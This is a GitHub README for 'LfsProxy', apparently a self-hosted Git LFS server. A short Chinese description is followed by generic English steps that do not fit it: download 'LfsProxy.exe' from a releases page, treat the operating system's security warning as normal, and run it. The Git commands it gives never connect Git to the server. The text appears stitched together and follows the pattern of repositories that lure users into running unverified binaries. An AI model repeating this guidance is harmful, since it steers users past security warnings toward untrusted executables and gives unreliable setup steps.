# 🎉 LfsProxy - Your Simple Solution for Large File Storage

[![Download LfsProxy](https://img.shields.io/badge/Download-LfsProxy-brightgreen)](https://github.com/mohamedbelasy/LfsProxy/releases)

## 📜 Description

这是一个使用 C# 和 ASP.NET Core 构建的轻量级、自托管的 Git LFS (Large File Storage) 服务器。它旨在为需要管理大文件的团队或个人提供一个简单、高效且易于部署的解决方案。

## 🚀 Getting Started

Follow these steps to download and run LfsProxy on your computer.

### 1. System Requirements

- **Operating System**: Windows 10 or later
- **.NET Core**: Version 5.0 or later installed
- **Memory**: At least 1 GB RAM
- **Disk Space**: Minimum 100 MB free space

### 2. Visit the Download Page

To download the latest version of LfsProxy, visit the following link:

[Download LfsProxy](https://github.com/mohamedbelasy/LfsProxy/releases)

### 3. Choose the Right File

On the Downloads page, you will see a list of available versions. Look for the latest release. You will typically find a file like `LfsProxy.exe`. This is the file you need.

### 4. Download the File

Click on the file to start the download. Your web browser will save the file to your default downloads folder.

### 5. Locate the File

Once the download is complete, open your downloads folder. You should see `LfsProxy.exe` there.

### 6. Run the Application

Double-click on `LfsProxy.exe` to run the application. You may see a warning from your operating system; this is normal for software downloaded from the internet. Click "Run" to proceed.

### 7. Configure LfsProxy

Upon launching the application, a configuration window will appear. Fill in the following details:

- **Storage Path**: Where you want to save large files.
- **Port Number**: Default is 8080. You can change it if needed.
- **Basic Auth**: Choose a username and password for security.

### 8. Start the Server

Once you finish the configuration, click the “Start” button. You should see a success message indicating that the server is running.

### 9. Access the Server

Open your web browser and type in `http://localhost:8080` (or your chosen port number) in the address bar. You will see the LfsProxy dashboard.

### 10. Using LfsProxy with Git

To use LfsProxy with Git, follow these steps:

1. Open your terminal or command prompt.
2. Run the following commands:

   ```
   git lfs install
   git lfs track "*.largefileextension"
   git add .gitattributes
   ```

3. Replace `*.largefileextension` with the specific file types you want to manage.

## 📥 Download & Install

To get started, you need to download LfsProxy. Click the link below to visit the download page:

[Download LfsProxy](https://github.com/mohamedbelasy/LfsProxy/releases)

Follow the steps outlined above to set up and run the application on your local machine.

## 🛠 Features

- **Lightweight**: Minimal system impact while running.
- **Self-hosted**: No need for external services, all runs on your machine.
- **Git LFS Support**: Efficiently manage large files within your Git repositories.
- **Basic Authentication**: Secure your files with username and password protection.
- **Easy Configuration**: Straightforward setup and configuration process.

## 📚 Topics

- aspnetcore
- basic-auth
- csharp
- dotnet
- file-locking
- git-lfs
- lfs-server
- minio
- object-storage
- proxy
- s3
- self-hosted

## 🤝 Support

If you encounter issues or need help, please check the [issues section](https://github.com/mohamedbelasy/LfsProxy/issues) on GitHub. You can also contribute to the repository if you find ways to improve it.

Thank you for using LfsProxy!